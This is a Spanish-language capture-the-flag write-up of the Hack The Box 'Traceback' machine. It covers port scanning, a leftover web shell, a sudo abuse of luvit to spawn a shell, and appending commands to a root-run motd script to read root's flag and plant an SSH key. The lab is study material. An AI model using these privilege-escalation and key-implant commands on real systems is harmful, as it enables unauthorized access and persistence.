---
title: "HTB – Traceback"
author: "Oscar Bravo"
header: 
  teaser: "/assets/images/post/2020/traceback.png"
categories:
  - WriteUp
---

OS 				 | LINUX
Desarrollado por | Xh4H
Dificultad 		 | Fácil
Liberación 		 | 14 marzo 2020
Puntos 			 | 20

## Enumeración

Al usar nmap utilizando **nmap -sCV -A 10.10.10.181** solo encontramos que está abierto el puerto 22 (SSH) y 80 (web).

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-20 01:42 BST
Nmap scan report for 10.10.10.181
Host is up (0.079s latency).
Not shown: 998 closed ports
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
| 256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_ 256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=4/20%OT=22%CT=1%CU=43037%PV=Y%DS=2%DC=T%G=Y%TM=5E9CF01 OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=102%TI=Z%CI=Z%II=I%TS=A)OPS( OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11 OS:NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN( OS:R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD= OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT ADDRESS
1 77.21 ms 10.10.14.1
2 77.32 ms 10.10.10.181

OS and Service detection performed. Please report any incorrect results at Nmap done: 1 IP address (1 host up) scanned in 24.47 seconds
```

Por lo que se empieza a buscar información en el código fuente de la página web, mientras se ejecuta la **dirbuster** para buscar paginas ocultas y poder acceder a ellas.

No se encuentra información importante por lo que se utiliza google para buscar nuevas soluciones. Encontramos que el creador posteo en su twitter algunas webshell interesantes.

![Traceback 1](/assets/images/post/2020/traceback1.png)

Al usar este nuevo listado en **dirbuster** con el nuevo listado descubrimos un archivo llamado smevk.php y al revisar el codigo de este en internet descubrimos que se puede acceder con el usuario admin/admin

![Traceback 2](/assets/images/post/2020/traceback2.png)

Acá nos permitirá crear nuestro propio archivo php, en este caso crearemos un php con una shell reverse, al ejecutarla accedemos a nuestra primera shell.

## 1° Shell

Al cargar esta shell accedemos al sistema con el usuario webadmin, por lo que nos ponemos a revisar sus carpetas, el historial y los permisos que este posee con **sudo –l**

Se ve que el usuario creó un archivo privesc.lua y despues lo elimina, sin antes ejecutarlo

```
Matching Defaults entries for webadmin on traceback:
	env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
	(sysadmin) NOPASSWD: /home/sysadmin/luvit
```

<p>Nos damos cuenta que podemos ejecutar un programa sin la password del usuario sysadmin, además creamos uno archivo lua, en el cual posea el comando <b>echo 'os.execute("/bin/sh")' > racso.lua</b>. Una vez que lo ejecutamos tal como se mostró en el historial podemos acceder a la shell del usuario</p>

## Shell Usuario

<p>Al escalar el privilegio obtenemos la primera flag, luego empezamos a buscar alguna otra forma de subir el privilegio a root, lo primero que vemos son los procesos <b>ps –aux</b> y nos llama la atención una que es ejecutada por <p>root</p> <i>(/bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/)</i> y lo que nos dice que se ejecuta el archivo 00-header cada vez que hay una conexión exitosa de SSH.</p>

Por otro lado, encontramos en la carpeta **.ssh** del usuario los archivos de autorización de las conexiones, es por ello que, ingresaremos nuestro propio ssh-rsa a este archivo para que sea válido al momento de conectarnos

- Creamos nuestro rsa con **ssh-keygen -t rsa**
- Copiamos este rsa.pub generado en el archivo **authorized_keys** escribiendo
	echo “TODO LO QUE EL ARCHIVO ID_RSA.PUB CONTENGA” >> /home/sysadmin/.ssh/authorized_keys
- Ejecutamos una conexión ssh desde nuestro equipo utilizando el id_rsa creado **ssh –i id_rsa sysadmin@10.10.10.181**

Lo que permitirá acceder vía ssh a la máquina, el problema es que hasta el momento mantenemos el mismo nivel de usuario.

Al seguir investigando sobre update-motd.d que está en la carpeta /etc/ nos percatamos que el usuario sysadmin tiene permiso de escritura para el archivo 00-header, por lo que ingresaremos un comando donde nos mostrará la flag.

<p>Si escribimos echo <b>"cat /root/root.txt" >> /etc/update-motd.d/00-header</b> tal como averiguamos antes cargará este comando al momento de acceder a la termina vía ssh mostrandonos la flag al acceder, sin obtener la shell root.</p>

## Root shell

No es necesario acceder a esta shell si solo quieren obtener las flag, pero si de igual forma quieren acceder se puede usar el mecanismo anterior pero ahora guardando la clave publica en el archivo authorized_keys del root, para ello escribimos lo siguiente

```
echo "echo \" LO QUE ESTA EN EL ID_RSA.PUB \" >> /root/.ssh/authorized_keys" >> /etc/update-motd.d/00-header
```

Ingresamos nuevamente como sysadmin, para que ejecute el comando y ahora al salir de la maquina podremos volver a conectarnos, pero con el usuario root

```
root@traceback:~# id && date uid=0(root) gid=0(root) groups=0(root) Sun Apr
```

![Racso](https://www.hackthebox.com/badge/image/159593)